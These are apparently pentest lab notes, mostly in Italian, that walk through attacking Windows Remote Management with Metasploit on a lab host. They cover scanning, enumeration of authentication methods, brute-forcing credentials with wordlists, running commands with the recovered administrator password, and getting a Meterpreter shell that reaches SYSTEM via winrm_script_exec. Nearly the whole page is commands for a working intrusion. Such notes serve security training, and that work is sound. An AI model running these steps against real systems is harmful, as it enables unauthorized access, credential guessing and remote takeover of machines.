# Exploiting WinRM (Windows Remote Management Protocol)

Deve essere abilitato WinRM, non è abilitato di default.

<figure><img src="../../../.gitbook/assets/image (782).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1067).png" alt=""><figcaption></figcaption></figure>

## Verifica metodi di autenticazione supportati da WinRM

```
postgresql service start
msfconsole
workspace -a WinRM
db_nmap -sS -sV -O -p- 10.4.22.219
search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods
show options
setg RHOSTS 10.4.22.219
show options
// verifichiamo che URI e porta siano corretti con un browser
run
```

<figure><img src="../../../.gitbook/assets/image (1068).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1069).png" alt=""><figcaption></figcaption></figure>

Vediamo che abbiamo la porta 5989 aperta che è quella di WinRM seppur il banner non ce lo dica specificatamente.

<figure><img src="../../../.gitbook/assets/image (1070).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1071).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1072).png" alt=""><figcaption></figcaption></figure>

Negotiate protocol e basic protocol, significa che possiamo fare un bruteforce per trovare username e password e poi fare l'accesso per eseguire comandi remoti.

## Bruteforce credenziali con modulo MSF&#x20;

<pre><code><strong>use auxiliary/scanner/winrm/winrm_login
</strong><strong>show options
</strong>set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
</code></pre>

<figure><img src="../../../.gitbook/assets/image (1073).png" alt=""><figcaption></figcaption></figure>

Note: This will take around 2-3 minutes.

Note: We are setting the PASSWORD because in the recent version of the "winrm\_login" module, the PASSWORD option is required unless using Kerberos authentication. Metasploit will still use the USERPASS\_FILE file.

<figure><img src="../../../.gitbook/assets/image (797).png" alt=""><figcaption></figcaption></figure>

We have found the valid password of the administrator user. Also, we got the command-shell session opened in the background. We'll further explore the other modules.

Possiamo usare la sessione aperta con il comando: **sessions 1**

## Testare se credenziali trovate funzionano con modulo MSF

```
search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
show options
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
run
```

<figure><img src="../../../.gitbook/assets/image (1074).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1075).png" alt=""><figcaption></figcaption></figure>

## Ottenere una meterpreter session via WinRM con modulo MSF

```
search winrm_script
use exploit/windows/winrm/winrm_script_exec
show options
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
run
```

<figure><img src="../../../.gitbook/assets/image (1076).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1077).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1078).png" alt=""><figcaption></figcaption></figure>

Nel caso qui sopra abbiamo un errore node test perché non abbiamo forzato il VBS (Visual Basic Script option) CommandStager invece del PowerShell command stager.

<figure><img src="../../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1081).png" alt=""><figcaption></figcaption></figure>

L'exploit fa automaticamente la migrazione ad un processo con NT Authority\SYSTEM, facendo quindi escalation dei privilegi al posto nostro.
